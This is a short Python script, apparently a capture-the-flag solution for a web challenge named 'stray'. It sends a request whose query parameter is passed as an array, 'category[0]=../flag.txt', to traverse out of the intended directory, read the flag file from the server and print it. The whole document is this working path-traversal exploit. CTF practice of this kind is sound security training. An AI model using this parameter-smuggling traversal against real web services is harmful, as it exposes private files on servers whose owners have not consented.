# send request to `https://stray.chall.pwnoh.io/cat?category[0]=../flag.txt` and print the response
import urllib.request
import json

URL = "https://stray.chall.pwnoh.io/cat?category[0]=../flag.txt"

response = urllib.request.urlopen(URL)
response_str = response.read().decode()

flag = json.loads(response_str)["name"]

print(flag)
